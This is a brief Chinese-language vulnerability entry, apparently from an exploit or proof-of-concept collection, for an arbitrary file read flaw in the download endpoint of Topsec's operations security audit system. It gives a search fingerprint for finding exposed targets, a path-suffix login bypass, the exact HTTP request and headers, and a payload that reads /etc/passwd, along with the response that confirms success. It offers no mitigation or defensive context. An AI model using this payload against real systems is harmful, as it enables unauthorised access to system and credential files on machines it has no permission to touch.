# 天融信运维安全审计系统download接口任意文件读取漏洞

- **系统**：天融信运维安全审计系统download接口　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`header="iam"`
- **请求**：`POST /iam/download;.login.jsp HTTP/1.1`
- **关键头**：`Sec-Fetch-User: ?1`　`Priority: u=0, i`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 38`

**请求体 / payload**
```
filename=test.txt&filepath=/etc/passwd
```
- **预期**：200　|　root: